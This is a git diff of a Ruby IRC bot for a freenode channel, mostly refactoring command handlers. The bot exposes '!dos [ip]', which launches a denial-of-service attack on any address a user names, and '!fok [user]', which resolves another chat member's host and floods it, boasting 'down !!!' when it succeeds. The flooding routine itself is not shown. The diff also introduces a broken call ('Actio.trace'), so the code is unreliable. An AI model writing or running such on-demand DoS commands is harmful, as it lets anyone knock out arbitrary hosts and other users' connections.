@@ -8,7 +8,7 @@ require 'pry'
 require_relative 'action'
 # require 'yaml'
 
-VERSION = "0.3.1"
+VERSION = "0.3.2"
 
 SEARCH_ENGINES = {
   "ddg" => "https://duckduckgo.com/?q=___MSG___",
@@ -29,6 +29,7 @@ SEARCH_ENGINES = {
 
 SEARCH_ENGINES_VALUES = SEARCH_ENGINES.values.map{|e|"!"+e}.join(', ')
 SEARCH_ENGINES_KEYS = SEARCH_ENGINES.keys.map{|e|"!"+e}.join(', ')
+SEARCH_ENGINES_HELP = SEARCH_ENGINES.keys.map{|e|"!"+e+" [search]"}.join(', ')
 TARGET = /[[:alnum:]_\-\.]+/
 
 def get_msg m
@@ -40,7 +41,7 @@ def get_ip m
 end
 
 def help m
-  m.reply "!cmds, !help, !version, !dos [ip], !fok [user], !ping, !ping [ip], !trace [ip], !code, !intra, !intra [on/off], #{SEARCH_ENGINES_KEYS}"
+  m.reply "!cmds, !help, !version, !dos [ip], !fok [user], !ping, !ping [ip], !trace [ip], !code, !intra, !intra [on/off], #{SEARCH_ENGINES_HELP}"
 end
 
 bot = Cinch::Bot.new do
@@ -51,11 +52,7 @@ bot = Cinch::Bot.new do
     else
       c.server = "irc.freenode.org"
       c.port = 7000
-      if ARGV[0] == "debug"
-        c.channels = ["#equilibres"]
-      else
-        c.channels = ["#equilibre"]
-      end
+      c.channels = ARGV[0] == "debug" ? ["#equilibres"] : ["#equilibre"]
       c.ssl.use = true
     end
 
@@ -85,7 +82,7 @@ bot = Cinch::Bot.new do
   end
 
   on :message, "!intra" do |m|
-    m.reply Net::Ping::External.new("intra.epitech.eu").ping? ? "Intra ok" : "Intra down"
+    m.reply Action.intra_state
   end
 
   INTRA_PING_SLEEP = 30
@@ -98,7 +95,7 @@ bot = Cinch::Bot.new do
         sleep 1
         loop do
           break if @intra_on == false
-          m.reply Net::Ping::External.new("intra.epitech.eu").ping? ? "Intra ok" : "Intra down"
+          m.reply Action.intra_state
           sleep INTRA_PING_SLEEP
         end
         @intra.unlock
@@ -141,8 +138,7 @@ bot = Cinch::Bot.new do
           raise "Unreachable host"
         end
         m.reply "Begin attack against #{ip}"
-        s = Action.dos(ip, DOS_DURATION)
-        s = s.split("\n")[3].to_s
+        s = Action.dos(ip, DOS_DURATION).split("\n")[3].to_s
         m.reply (Action.ping(ip) ? "failed :(" : "down !!!") + " " + s
         sleep DOS_WAIT
         @dos.unlock
@@ -157,13 +153,9 @@ bot = Cinch::Bot.new do
   on :message, /!fok #{TARGET}\Z/ do |m|
     nick = get_ip m
     ip = m.target.users.keys.find{|u| u.nick == nick rescue nil}.host rescue nil
-    if ip.nil?
-      return m.reply "User '#{nick}' doesn't exists"
-    elsif not Action.ping(ip)
-      return m.reply "Cannot reach the host '#{ip}'"
-    end
-    s = Action.dos(ip, DOS_DURATION)
-    s = s.split("\n")[3].to_s
+    return m.reply "User '#{nick}' doesn't exists" if ip.nil?
+    return m.reply "Cannot reach the host '#{ip}'" if not Action.ping(ip)
+    s = Action.dos(ip, DOS_DURATION).split("\n")[3].to_s
     m.reply "#{nick} : " + (Action.ping(ip) ? "failed :(" : "down !!!") + " " + s
   end
 
@@ -173,11 +165,9 @@ bot = Cinch::Bot.new do
       begin
         ip = get_ip m
         m.reply "It can take time"
-        t1 = Time.now
-        s = `tracepath '#{ip}'`.to_s.split("\n")
-        t2 = Time.now
+        t1 = Time.now; s = Actio.trace; t2 = Time.now
         m.reply "Used #{(t2 - t1).round(3)} seconds"
-        so = s.select{|e| not e.include? "no reply" and e =~ /\A \d+: .+/}.uniq
+        so = s.select{|e| not e.include? "no reply" and e =~ /\A \d+: .+/}
         @trace.unlock
         duration = 0.3
         so.each{|l| m.reply l; sleep duration; duration += 0.1}
@@ -192,7 +182,6 @@ bot = Cinch::Bot.new do
 
   on :message, "!cmds" do |m|
     help m
-    binding.pry
   end
 
   on :message, "!help" do |m|
